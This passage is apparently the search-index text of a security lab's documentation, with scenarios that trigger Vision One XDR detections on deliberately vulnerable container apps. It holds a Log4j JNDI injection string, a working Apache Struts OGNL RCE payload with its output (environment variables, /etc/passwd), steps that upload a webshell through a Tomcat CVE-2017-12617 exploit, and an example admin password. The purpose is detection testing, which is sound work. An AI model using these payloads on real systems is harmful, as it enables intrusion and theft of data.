Gateway.</p>"},{"location":"scenarios/vision-one/v1-integrate-active-directory/#connect-the-managed-active-directory","title":"Connect the Managed Active Directory","text":"<p>From within your console/shell run the following command (or find the output from the previous step):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nmad_id = \"d-99677cba24\"\nmad_ips = toset([\n  \"10.0.0.37\",\n  \"10.0.1.229\",\n])\n...\nkey_name = \"pgo-key-pair-oaxuizlr\"\nmad_admin_password = &lt;sensitive&gt;\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting values are now <code>mad_ips</code> and the <code>mad_admin_password</code>.</p> <p>Lastly, in the Connection Settings choose the following parameters:</p> <ul> <li>Server address: One of the private IPs out of <code>mad_ips</code></li> <li>Encryption: <code>NONE</code> (the MAD built by Playground One does not have a certificate yet)</li> <li>Port: <code>389</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>admin</code></li> <li>Password: <code>mad_admin_password</code></li> </ul> <p></p> <p>This should connect the Active Directory to Vision One via the Service Gateway.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr/oat-generation/","title":"Scenario: Automated Observed Attack Techniques Generation","text":""},{"location":"scenarios/xdr/oat-generation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 or Fargate Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 or Fargate Cluster including the Scenarios up and running:</p> <pre><code># EC2 only\npgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>or</p> <pre><code># Fargate\npgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/xdr/oat-generation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr/oat-generation/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security Observed Attack Techniques and the generation of Workbenches.</p>"},{"location":"scenarios/xdr/oat-generation/#the-story","title":"The story","text":"<p>Several attack techniques will be detected after the deployment depending on your Container Security Runtime Policy. For full coverage enable all rules and set them to <code>Log</code>.</p> <p>Since the attacks are executed every full hour there is no need to scroll through the detections.</p> <p>Screenshot of generated OATs:</p> <p></p>"},{"location":"scenarios/xdr/oat-generation/#goals","title":"Goals","text":"<p>Review the detections in Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr/workbench-generation/","title":"Scenario: Automated Workbench Generation","text":""},{"location":"scenarios/xdr/workbench-generation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 or Fargate Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 or Fargate Cluster including the Scenarios up and running:</p> <pre><code># EC2 only\npgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>or</p> <pre><code># Fargate\npgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/xdr/workbench-generation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr/workbench-generation/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security. This scenario is very similar to the OAT Generation, but focuses on generated Workbenches.</p>"},{"location":"scenarios/xdr/workbench-generation/#the-story","title":"The story","text":"<p>Several attack techniques will be detected after the deployment depending on your Container Security Runtime Policy. For full coverage enable all rules and set them to <code>Log</code>.</p> <p>Since the attacks are executed every full hour there is no need to scroll through the generated Workbenches.</p> <p>Screenshot of generated Workbenches:</p> <p></p> <p>The first Workbench is mostly because of using Terraform creating the environment. Since this happens obviously bb</p> <p>A simple but good demo Workbench is the <code>Compile Source File Code After Delivery in Container</code>.</p> <p></p> <p>Here, a <code>.c</code> file is dropped into the container which is then compiled by <code>gcc</code>.</p>"},{"location":"scenarios/xdr/workbench-generation/#goals","title":"Goals","text":"<p>Review the detections in Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr4c/ecs-log4j/","title":"Scenario: Detect JNDI Injection in HTTP Request (Log4j)","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-log4j/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploit","title":"Exploit","text":"<p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>${jndi:ldap://host.docker.internal:9999/Commons2}</code></li> <li>Password: <code>does not matter</code></li> </ul> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Note: The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.</p>"},{"location":"scenarios/xdr4c/ecs-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/","title":"Scenario: Detect Tomcat RCE","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#checking-if-app-server-is-vulnerable","title":"Checking if app server is vulnerable","text":"<p>Now you can check to see if the tomcat server is vulnerable. If it is you should see something similar to the following:</p> <pre><code>cd ${ONEPATH}/exploits/tomcat-rce/\npython3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n\n\n[@intx0x80]\n\n\nPoc Filename  Poc.jsp\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it's Vulnerable to CVE-2017-12617\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp\n</code></pre> <p>If you point a browser at http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp you should get a test page with a bunch of \"A\" char's - that shows the exploit worked.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#inject-the-exploit-and-run-commands-in-the-container-from-browser","title":"Inject the exploit and run commands in the container from browser","text":"<p>Next, inject the exploit and just hit <code>ENTER</code> at the shell prompt that comes up. (Ignore the error afterward)</p> <pre><code>python3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com -p pwn\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n\n\n[@intx0x80]\n\n\nUploading Webshell .....\n$ \n</code></pre> <p>Either in the shell or from within your browser http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp test some commands like <code>whoami</code> or <code>dpkg -l</code>.</p> <p>Your browser should present you a blank page with a form containing single field and a <code>Run</code> button. Type any Linux command you want and submit the form. The results will populate the page.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/eks-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>DRAFT</p>"},{"location":"scenarios/xdr4c/eks-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply eks\npgo --apply scenarios\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/eks-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o scenarios\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>loadbalancer_dns_health_check = \"k8s-goat-healthch-e9104c52db-803985454.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_hunger_check = \"k8s-goat-hungerch-0816ee11b2-1006982801.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_java_goof = \"k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_system_monitor = \"k8s-goat-systemmo-09a16052b6-565756108.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>You want the variable <code>loadbalancer_dns_java_goof</code>.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 3.120.84.56:80...\n* Connected to k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com (3.120.84.56) port 80 (#0)\n&gt; GET /todolist/ HTTP/1.1\n&gt; Host: k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nWEB_APP_SERVICE_SERVICE_PORT=80\nKUBERNETES_SERVICE_PORT_HTTPS=443\nTREND_AP_LOG_FILE=STDERR\nJAVA_GOOF_SERVICE_SERVICE_PORT=8080\nKUBERNETES_SERVICE_PORT=443\nWEB_APP_SERVICE_PORT_80_TCP_ADDR=172.20.245.34\nMAVEN_CONFIG=/root/.m2\nMAVEN_PROJECTBASEDIR=/usr/src/goof\nHOSTNAME=java-goof-6c95b8cd5f-qn49h\nMAVEN_CMD_LINE_ARGS=/root/.m2 tomcat7:run\nJAVA_GOOF_SERVICE_PORT_8080_TCP_PORT=8080\n...\n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n* Connection #0 to host k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com left intact\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"}]}